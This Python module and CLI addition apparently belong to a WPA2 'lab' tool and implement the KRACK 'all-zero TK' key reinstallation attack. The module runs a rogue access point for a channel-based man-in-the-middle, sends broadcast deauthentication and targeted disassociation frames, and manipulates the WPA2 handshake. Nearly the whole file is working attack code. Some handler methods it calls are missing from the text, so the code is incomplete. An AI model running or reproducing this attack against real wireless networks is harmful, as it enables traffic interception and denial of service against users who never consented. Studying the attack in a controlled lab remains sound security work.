# krack_attack.py
"""
Módulo interno que implementa el ataque KRACK "all-zero TK" sin depender de un repositorio externo.
"""
from scapy.all import *
import time, heapq, atexit, select
from mitm_channel_based.mitm_code import MitmChannelBased
from mitm_channel_based.log_messages import log, INFO, STATUS, DEBUG, WARNING, ERROR

class ClientState:
    Initializing, Connecting, GotMitm, Attack_Started, Success_Reinstalled, Success_AllzeroKey, Failed = range(7)

    def __init__(self, macaddr):
        self.macaddr = macaddr
        self.reset()

    def reset(self):
        self.state = ClientState.Initializing
        self.attack_time = None
        self.assocreq = None
        self.msg1 = None
        self.msg3s = []
        self.msg4 = None

    def store_msg1(self, pkt):
        self.msg1 = pkt

    def add_if_new_msg3(self, pkt):
        rep = get_eapol_replaynum(pkt)
        if rep not in [get_eapol_replaynum(p) for p in self.msg3s]:
            self.msg3s.append(pkt)

    def update_state(self, new):
        log(DEBUG, f"Client {self.macaddr} -> state {new}")
        self.state = new

    def mark_got_mitm(self):
        if self.state <= ClientState.Connecting:
            self.state = ClientState.GotMitm
            log(STATUS, f"Got MitM on {self.macaddr}", color="green")

    def should_forward(self, pkt):
        num = get_eapol_msgnum(pkt)
        if self.state in (ClientState.Connecting, ClientState.GotMitm, ClientState.Attack_Started):
            return Dot11Auth in pkt or Dot11AssoReq in pkt or Dot11AssoResp in pkt or (1 <= num <= 3)
        return self.state == ClientState.Success_AllzeroKey

    def attack_start(self):
        self.attack_time = time.time()
        self.update_state(ClientState.Attack_Started)

    def is_iv_reset(self, iv):
        return self.state == ClientState.Attack_Started and iv == 1

    def attack_timeout(self, iv):
        return self.state == ClientState.Attack_Started and self.attack_time + 1.5 < time.time()

class KRAckAttack:
    def __init__(self, real_iface, rogue_iface, ether_iface, ssid, target_mac=None, continuous_csa=False):
        self.real = real_iface
        self.rogue = rogue_iface
        self.ether = ether_iface
        self.ssid = ssid
        self.target = target_mac
        self.continuous = continuous_csa
        self.clients = {}
        self.queue = []
        self.mitm = MitmChannelBased(real_iface, rogue_iface, rogue_iface, ether_iface, ssid, target_mac)
        atexit.register(self.stop)

    def send_disas(self, mac):
        pkt = Dot11(addr1=mac, addr2=self.mitm.apmac, addr3=self.mitm.apmac)/Dot11Disas(reason=0)
        self.mitm.sock_rogue.send(pkt)
        log(STATUS, f"Disas to {mac}", color="green")

    def run(self):
        self.mitm.run()
        # initial deauth
        deauth = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.mitm.apmac, addr3=self.mitm.apmac)/Dot11Deauth(reason=3)
        self.mitm.sock_real.send(deauth)
        next_beacon = time.time()
        while True:
            r,_,_ = select.select([self.mitm.sock_real, self.mitm.sock_rogue, self.mitm.hostapd.stdout], [], [], 0.1)
            if self.mitm.sock_real in r: self._handle_real()
            if self.mitm.sock_rogue in r: self._handle_rogue()
            if self.mitm.hostapd.stdout in r: self._handle_hostapd()
            if self.continuous and time.time() >= next_beacon:
                self.mitm.send_csa_beacon(newchannel=self.mitm.rogue_channel, silent=True)
                next_beacon = time.time() + 0.1

    def stop(self):
        log(STATUS, "Cleaning up hostapd...", color="yellow")
        if self.mitm.hostapd: self.mitm.hostapd.terminate()
        if self.mitm.hostapd_log: self.mitm.hostapd_log.close()

# ----------------- wpa2lab_cli.py modifications -----------------
# Importa el módulo:
# from krack_attack import KRAckAttack

@app.command("krack-attack")
def krack_attack(
    real: str = typer.Option(None, "--real", "-r", help="Interface modo monitor real"),
    rogue: str = typer.Option(None, "--rogue", "-R", help="Interface del rogue AP"),
    ether: str = typer.Option(..., "--eth", help="Interface ethernet para el rogue AP"),
    ssid: str = typer.Argument(..., help="SSID objetivo"),
    target: str = typer.Option(None, "--target", help="MAC cliente específico"),
    continuous: bool = typer.Option(False, "--continuous-csa"),
):
    """Lanza un ataque KRACK "all-zero TK" sin repos externos."""
    real_iface = real or resolve_iface("monitor", None)
    rogue_iface = rogue or resolve_iface("ap", None, exclude=[real_iface])
    console.print(Panel.fit(f"[magenta]KRACK Attack[/magenta]\nReal: {real_iface}  Rogue: {rogue_iface}\nSSID: {ssid}", title="KRACK"))
    attack = KRAckAttack(real_iface, rogue_iface, ether, ssid, target, continuous)
    attack.run()
